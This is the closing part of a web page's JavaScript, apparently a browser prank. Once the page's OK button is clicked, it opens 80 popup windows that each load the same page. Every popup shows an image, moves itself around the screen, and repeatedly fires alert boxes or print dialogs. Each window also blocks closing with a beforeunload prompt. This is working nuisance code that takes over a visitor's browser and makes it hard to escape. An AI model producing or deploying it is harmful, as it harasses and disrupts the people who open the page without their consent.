const wins = [];
const WIDTH = 280;
const HEIGHT = 280;
const SPEED = 15;
const COUNT = 80;
const MARGIN = 8;
const W = screen.availWidth;
const H = screen.availHeight;

const isChild = window.opener != null;

if (isChild) {
  document.title = '';
  document.body.style.cssText = 'margin:0;padding:0;overflow:hidden;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;';
  const img = document.createElement('img');
  img.src = MOSTFAMOUSMAM;
  img.style.cssText = 'width:100%;height:100%;object-fit:cover;image-rendering:pixelated;';
  document.body.innerHTML = '';
  document.body.appendChild(img);

  let vx = SPEED * (Math.random() > 0.5 ? 1 : -1);
  let vy = SPEED * (Math.random() > 0.5 ? 1 : -1);
  setInterval(() => {
    const x = window.screenX, y = window.screenY;
    if (x <= MARGIN) vx = Math.abs(vx);
    if (x + WIDTH >= W - MARGIN) vx = -Math.abs(vx);
    if (y <= MARGIN + 20) vy = Math.abs(vy);
    if (y + HEIGHT >= H - MARGIN) vy = -Math.abs(vy);
    window.moveBy(vx, vy);
  }, 30);

  setTimeout(() => {
    setInterval(() => {
      if (Math.random() < 0.5) alert('gubby!!!!!!!!!!!!!!!!!!!');
      else window.print();
    }, 30000);
  }, Math.random() * 10000);

  window.addEventListener('beforeunload', e => {
    e.preventDefault();
    e.returnValue = '';
  });
}

function spawnAll() {
  document.getElementById('ok-btn').style.display = 'none';
  document.body.style.background = '#000';
  for (let i = 0; i < COUNT; i++) {
    setTimeout(() => spawnOne(), i * 50);
  }
}

function spawnOne() {
  const x = MARGIN + Math.floor(Math.random() * (W - WIDTH - MARGIN * 2));
  const y = MARGIN + Math.floor(Math.random() * (H - HEIGHT - MARGIN * 2));
  const win = window.open(
    window.location.href,
    '',
    `width=${WIDTH},height=${HEIGHT},left=${x},top=${y},toolbar=no,menubar=no,scrollbars=no,status=no`
  );
  if (!win) return;
  wins.push(win);
  win.addEventListener('beforeunload', e => {
    e.preventDefault();
    e.returnValue = '';
  });
}
</script>
</body>
</html>
